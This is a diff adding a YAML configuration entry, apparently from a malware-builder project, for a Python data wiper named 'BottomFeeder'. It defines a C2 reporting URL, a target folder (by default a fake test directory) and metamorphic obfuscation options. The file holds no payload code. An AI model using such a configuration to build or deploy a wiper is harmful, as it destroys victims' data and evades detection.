@@ -1,0 +1,26 @@
+name: BottomFeeder
+malware_type: Wiper
+lang: Python
+auth_key: 1561226202281848524941727429005598806706
+description: |
+  BottomFeeder is a Wiper, a software that aim to destruct data, not even looking to render them locked behind a ransom, it just destruct everything it is tasked to do.
+  Really dangerous, should be used with caution.
+
+specific_feature:
+  c2_url:
+    label: "C2 Server URL"
+    description: "The URL where the infected host should send data regarding the state of the cleaning, timestamp, ..."
+    type: "text"
+    default: "https://example.com/api"
+  folder_path:
+    label: "Targeted Folder"
+    description: "The folder that will be wiped."
+    type: "text"
+    default: "C:\\Users\\XXX\\Documents\\fake_env_Documents"
+
+available_features:
+- metamorphic-bloc_swap
+- metamorphic-dead_code
+- metamorphic-noop
+- metamorphic-rename_var
+- metamorphic-string_mutation
